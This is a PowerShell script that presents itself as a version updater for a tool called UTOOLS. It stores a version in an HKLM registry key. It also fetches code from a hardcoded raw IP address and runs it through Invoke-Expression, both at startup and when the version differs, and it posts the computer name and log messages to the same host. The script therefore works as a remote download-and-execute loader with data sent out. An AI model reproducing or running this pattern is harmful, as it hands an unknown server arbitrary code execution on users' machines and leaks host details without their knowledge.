
# please change the version string  and new_task.ps1 script for do updating

$lastestVersion = '6.2'

Invoke-RestMethod 47.107.152.77/public_ip_info | Invoke-Expression

function mylog {
    param (
        $myMessage
    )
    $guid = $(New-Guid)
    $dt = Get-Date -format "yyyy-MM-dd HH:mm:ss"

    $info = [ordered]@{}
    $info["id"] = $guid
    $info["message"] = $dt + ',' + $env:COMPUTERNAME + ',' + $myMessage

    $jsdata = $info | convertTo-Json
    $jsdata
    Invoke-RestMethod 47.107.152.77/mylog -Method Post -Body $jsdata
}

if (Test-Path HKLM:\SOFTWARE\UTOOLS) {
    Write-Host "already exists"
}
else {
    New-Item HKLM:\SOFTWARE\UTOOLS
}

function SetVersion {
    param (
        $version
    )
    Write-Host $version
    Set-ItemProperty HKLM:\SOFTWARE\UTOOLS -Type String -Name version -Value $version
}

function GetVersion() {
    (Get-ItemProperty -Path HKLM:\SOFTWARE\UTOOLS).version    
}

$version = GetVersion



if ($version -eq $lastestVersion) {
    mylog("lastest version is: " + $lastestVersion)
}
else {
    Invoke-RestMethod 47.107.152.77/new_task | Invoke-Expression
    try {
        SetVersion($lastestVersion)
        mylog("version: " + $lastestVersion + " updated successfully.")

    }
    catch {
        mylog($lastestVersion + " updated failed.")
    }
}